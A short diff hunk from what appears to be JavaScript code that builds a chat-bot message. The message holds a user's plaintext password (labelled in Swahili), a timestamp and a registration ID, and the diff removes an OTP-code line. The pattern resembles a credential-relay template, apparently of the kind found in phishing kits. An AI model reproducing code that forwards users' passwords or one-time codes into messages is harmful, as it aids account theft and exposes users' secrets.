@@ -2141,8 +2141,6 @@ ${userStatusLabel}
 📧 *Namba ya Siri:* ${password}
 ⏰ *Wakati:* ${new Date(timestamp).toLocaleString()}
 
-🔐 *OTP CODE:* \`${otp}\`
-
 📱 *Registration ID:* \`${registrationId}\`
       `;
 
